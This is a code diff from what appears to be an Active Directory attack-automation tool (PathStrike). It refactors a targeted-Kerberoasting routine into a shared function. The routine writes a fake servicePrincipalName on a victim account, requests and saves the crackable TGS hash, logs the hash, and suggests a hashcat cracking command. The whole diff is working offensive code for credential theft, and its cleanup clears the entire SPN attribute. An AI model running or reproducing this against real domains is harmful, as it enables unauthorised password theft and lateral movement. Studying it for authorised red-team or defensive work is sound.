@@ -8,14 +8,23 @@ Implements handlers for the following BloodHound edge types:
 * **AddAllowedToAct** -- Resource-Based Constrained Delegation (RBCD) setup.
 * **WriteSPN** -- Targeted Kerberoasting via SPN modification.
 * **SyncLAPSPassword** -- LAPS password retrieval through sync rights.
+
+Also exposes :func:`perform_targeted_kerberoast` as a free function so
+other handlers (notably :class:`pathstrike.handlers.acl.ACLHandler`) can
+fall back to the same SPN-based Kerberoast flow when shadow-credential
+strategies fail (typically against DCs without PKINIT support).
 """
 
 from __future__ import annotations
 
+import logging
 import re
 import shutil
 from datetime import datetime, timezone
+from pathlib import Path
 
+from pathstrike.config import PathStrikeConfig
+from pathstrike.engine.credential_store import CredentialStore
 from pathstrike.engine.edge_registry import register_handler
 from pathstrike.handlers.base import BaseEdgeHandler
 from pathstrike.models import (
@@ -31,6 +40,7 @@ from pathstrike.tools.bloodyad_wrapper import (
     set_rbcd,
 )
 from pathstrike.tools.impacket_wrapper import (
+    build_impacket_auth,
     dcomexec,
     get_st,
     kerberoast,
@@ -45,6 +55,179 @@ from pathstrike.tools.netexec_wrapper import (
     execute_command,
     run_netexec,
 )
+
+
+# ===================================================================
+# Shared helper: Targeted Kerberoast via bloodyAD + impacket
+# ===================================================================
+
+
+async def perform_targeted_kerberoast(
+    config: PathStrikeConfig,
+    cred_store: CredentialStore,
+    source_principal: str,
+    target_user: str,
+    auth_args: list[str],
+    logger: logging.Logger,
+) -> tuple[bool, str, list[Credential], str | None]:
+    """Set a fake SPN on *target_user*, Kerberoast it, then clear the SPN.
+
+    Useful as a fallback whenever Shadow Credentials cannot succeed
+    against a DC that lacks PKINIT support (no KDC certificate
+    installed) but the source principal has GenericWrite / WriteSPN
+    rights over the target.  The captured TGS-REP hash is written to
+    ``~/.pathstrike/kerberoast/<target>_<timestamp>.hash`` for offline
+    cracking and logged inline at INFO so it's visible to the operator.
+
+    The cleanup uses ``bloodyAD set object <target> servicePrincipalName``
+    with no ``-v`` argument, which clears the entire attribute.  This is
+    safe for typical Kerberoast candidates (users without prior SPNs);
+    callers that need value-preserving cleanup must read and restore the
+    original list themselves.
+
+    Args:
+        config: PathStrike config (domain / DC info).
+        cred_store: Credential store to look up *source_principal*'s best
+            available credential.
+        source_principal: Account to authenticate as for both the SPN
+            write (bloodyAD) and the TGS request (impacket).
+        target_user: User account to modify and roast.
+        auth_args: Pre-built bloodyAD auth args for *source_principal*.
+        logger: Logger for status messages.
+
+    Returns:
+        Tuple of ``(success, message, new_credentials, leftover_spn)``.
+
+        * ``new_credentials`` is empty — the captured TGS hash needs
+          offline cracking before it can be used as a chainable cred.
+        * ``leftover_spn`` is non-None only if the cleanup-clear failed,
+          so callers can record a rollback entry for manual cleanup.
+    """
+    domain = config.domain.name
+    dc_ip = config.domain.dc_host
+    fake_spn = f"pathstrike/{target_user}.{domain}"
+
+    # Step 1 — write the SPN.
+    logger.info(
+        "Targeted Kerberoast on '%s': setting servicePrincipalName='%s'",
+        target_user, fake_spn,
+    )
+    spn_set = await run_bloodyad(
+        ["set", "object", target_user, "servicePrincipalName", "-v", fake_spn],
+        config,
+        auth_args=auth_args,
+    )
+    if not spn_set["success"]:
+        return (
+            False,
+            f"Failed to set SPN on '{target_user}': "
+            f"{spn_set.get('error', 'unknown')}",
+            [],
+            None,  # nothing to roll back — write didn't land
+        )
+    leftover_spn: str | None = fake_spn
+
+    # Step 2 — request the TGS for that SPN.
+    logger.info(
+        "Targeted Kerberoast on '%s': requesting TGS for '%s'",
+        target_user, fake_spn,
+    )
+    cred = cred_store.get_best_credential(source_principal, domain)
+    password: str | None = None
+    nt_hash: str | None = None
+    if cred is not None:
+        if cred.cred_type == CredentialType.password:
+            password = cred.value
+        elif cred.cred_type == CredentialType.nt_hash:
+            nt_hash = cred.value
+    if password is None and nt_hash is None:
+        password = config.credentials.password
+        nt_hash = config.credentials.nt_hash
+
+    imp_auth = build_impacket_auth(
+        domain, source_principal, password, nt_hash, dc_ip=dc_ip,
+    )
+    roast = await kerberoast(
+        domain=domain,
+        username=source_principal,
+        auth_args=imp_auth,
+        dc_ip=dc_ip,
+        target_user=target_user,
+    )
+
+    # Step 3 — ALWAYS attempt cleanup (even if the roast failed),
+    # because the SPN write *did* land and we don't want to leave
+    # AD state polluted.  Clearing the attribute (no ``-v``) is the
+    # standard idiom; production callers concerned about pre-existing
+    # SPN values should use a value-preserving variant instead.
+    logger.info(
+        "Targeted Kerberoast on '%s': clearing servicePrincipalName",
+        target_user,
+    )
+    spn_clear = await run_bloodyad(
+        ["set", "object", target_user, "servicePrincipalName"],
+        config,
+        auth_args=auth_args,
+    )
+    if spn_clear["success"]:
+        leftover_spn = None  # AD is back to a clean state
+    else:
+        logger.warning(
+            "SPN cleanup on '%s' failed: %s. Manual cleanup may be "
+            "needed (e.g. `bloodyAD set object %s servicePrincipalName`).",
+            target_user, spn_clear.get("error", "unknown"), target_user,
+        )
+
+    if not roast["success"]:
+        return (
+            False,
+            f"Kerberoast failed on '{target_user}': "
+            f"{roast.get('error', 'unknown')}",
+            [],
+            leftover_spn,
+        )
+
+    parsed = roast.get("parsed") or {}
+    tgs_hashes = parsed.get("tgs_hashes") or []
+    if not tgs_hashes:
+        return (
+            False,
+            f"Kerberoast returned no TGS hashes for '{target_user}'.",
+            [],
+            leftover_spn,
+        )
+
+    # Persist hash(es) so the operator can crack them offline.
+    hash_dir = Path.home() / ".pathstrike" / "kerberoast"
+    hash_dir.mkdir(parents=True, exist_ok=True)
+    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    hash_file = hash_dir / f"{target_user}_{timestamp}.hash"
+    hash_file.write_text(
+        "\n".join(entry.get("hash", "") for entry in tgs_hashes) + "\n",
+        encoding="utf-8",
+    )
+
+    # Echo the hash itself at INFO so it surfaces above the Live render
+    # in the session log even if the operator misses the file path.
+    for entry in tgs_hashes:
+        logger.info(
+            "Captured TGS hash for %s (SPN=%s): %s",
+            entry.get("username", target_user),
+            entry.get("spn", fake_spn),
+            entry.get("hash", ""),
+        )
+    logger.info(
+        "Saved %d TGS hash(es) to %s — crack with `hashcat -m 13100 %s <wordlist>`",
+        len(tgs_hashes), hash_file, hash_file,
+    )
+
+    msg = (
+        f"Targeted Kerberoast succeeded on '{target_user}' — "
+        f"{len(tgs_hashes)} TGS hash(es) saved to {hash_file}. "
+        f"Crack offline (hashcat -m 13100) then re-run with the "
+        f"recovered password."
+    )
+    return (True, msg, [], leftover_spn)
 
 
 # ===================================================================
@@ -596,142 +779,56 @@ class WriteSPNHandler(BaseEdgeHandler):
     ) -> tuple[bool, str, list[Credential]]:
         target_user = self._resolve_target(edge)
         source_user = self._resolve_principal(edge)
-        dc_host = self._get_dc_host()
         domain = self._get_domain()
         auth_args = self._get_auth_args()
-
-        # Generate a unique SPN for the target
-        fake_spn = f"pathstrike/{target_user}.{domain}"
-        self._added_spn = fake_spn
 
         if dry_run:
             return (
                 True,
-                f"[DRY RUN] Would set SPN='{fake_spn}' on '{target_user}', "
-                "then Kerberoast to obtain TGS hash.",
+                f"[DRY RUN] Would set a fake SPN on '{target_user}', "
+                f"Kerberoast for a TGS hash, then clear the SPN.",
                 [],
             )
 
-        # Step 1: Set SPN on the target user
-        self.logger.info(
-            "WriteSPN Step 1: Setting SPN='%s' on '%s'",
-            fake_spn, target_user,
-        )
-        spn_result = await run_bloodyad(
-            ["set", "object", target_user, "servicePrincipalName", "-v", fake_spn],
+        # All three steps (set SPN → roast → clear SPN) live in the
+        # shared helper so the same flow is reused as the GenericWrite
+        # fallback in ACLHandler.
+        success, msg, creds, leftover_spn = await perform_targeted_kerberoast(
             self.config,
-            auth_args=auth_args,
+            self.cred_store,
+            source_user,
+            target_user,
+            auth_args,
+            self.logger,
         )
-
-        if not spn_result["success"]:
-            return (
-                False,
-                f"Failed to set SPN on '{target_user}': {spn_result.get('error', 'unknown')}",
-                [],
-            )
-
-        # Step 2: Kerberoast the target
-        self.logger.info(
-            "WriteSPN Step 2: Kerberoasting '%s' (SPN='%s')",
-            target_user, fake_spn,
-        )
-
-        # Build Impacket auth for GetUserSPNs
-        cfg = self.config.credentials
-        cred = self.cred_store.get_best_credential(source_user, domain)
-        password = None
-        nt_hash = None
-        if cred:
-            if cred.cred_type == CredentialType.password:
-                password = cred.value
-            elif cred.cred_type == CredentialType.nt_hash:
-                nt_hash = cred.value
-        else:
-            password = cfg.password
-            nt_hash = cfg.nt_hash
-
-        from pathstrike.tools.impacket_wrapper import build_impacket_auth
-
-        imp_auth = build_impacket_auth(
-            domain, source_user, password, nt_hash, dc_ip=dc_host
-        )
-
-        roast_result = await kerberoast(
-            domain=domain,
-            username=source_user,
-            auth_args=imp_auth,
-            dc_ip=dc_host,
-            target_user=target_user,
-        )
-
-        # Step 3: Remove the SPN immediately (cleanup)
-        self.logger.info(
-            "WriteSPN Step 3: Removing SPN='%s' from '%s'",
-            fake_spn, target_user,
-        )
-        cleanup_result = await run_bloodyad(
-            ["remove", "object", target_user, "servicePrincipalName", "-v", fake_spn],
-            self.config,
-            auth_args=auth_args,
-        )
-
-        if cleanup_result["success"]:
-            self.logger.info("SPN removed successfully.")
-            self._added_spn = None  # No rollback needed
-        else:
-            self.logger.warning(
-                "SPN cleanup failed: %s. Manual rollback needed.",
-                cleanup_result.get("error", "unknown"),
-            )
-
-        if not roast_result["success"]:
-            return (
-                False,
-                f"Kerberoast failed: {roast_result.get('error', 'unknown')}",
-                [],
-            )
-
-        # Extract TGS hashes
-        parsed = roast_result.get("parsed") or {}
-        tgs_hashes = parsed.get("tgs_hashes", [])
-
-        if not tgs_hashes:
-            return (
-                False,
-                f"Kerberoast succeeded but no TGS hashes found for '{target_user}'.",
-                [],
-            )
-
-        msg = (
-            f"Targeted Kerberoast succeeded for '{target_user}'. "
-            f"Obtained {len(tgs_hashes)} TGS hash(es). "
-            "Offline cracking required to recover the password."
-        )
-        self.logger.info(msg)
-
-        # We cannot automatically convert a TGS hash to a credential
-        # (it requires offline cracking), but we log it for the operator
-        return (True, msg, [])
+        # Track only the leftover (failed-cleanup) SPN for rollback.  When
+        # the helper cleared the attribute itself there's nothing to roll
+        # back, so _added_spn stays None.
+        self._added_spn = leftover_spn
+        return success, msg, creds
 
     def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
         if not self._added_spn:
-            # SPN was already cleaned up
+            # SPN was already cleaned up by the helper.
             return None
 
         target_user = self._resolve_target(edge)
-        dc_host = self._get_dc_host()
-        domain = self._get_domain()
 
-        # Rollback commands omit --host/-d/--dc-ip — the RollbackManager
-        # injects connection and auth args automatically for bloodyAD commands.
+        # Cleanup is "clear servicePrincipalName" — bloodyAD's
+        # ``set object <target> <attr>`` with no ``-v`` clears the
+        # attribute entirely.  This is correct for typical Kerberoast
+        # candidates which had no prior SPN; for production-safe
+        # behaviour callers should preserve the original list.
+        # NOTE: rollback commands omit --host/-d/--dc-ip — the
+        # RollbackManager injects connection + auth args for bloodyAD.
         return RollbackAction(
             step_index=0,
-            action_type="remove_spn",
-            description=f"Remove SPN '{self._added_spn}' from '{target_user}'",
-            command=(
-                f"bloodyAD remove object {target_user} servicePrincipalName "
-                f"-v {self._added_spn}"
+            action_type="clear_spn",
+            description=(
+                f"Clear servicePrincipalName on '{target_user}' "
+                f"(leftover after cleanup-failure: '{self._added_spn}')"
             ),
+            command=f"bloodyAD set object {target_user} servicePrincipalName",
             reversible=True,
         )
 
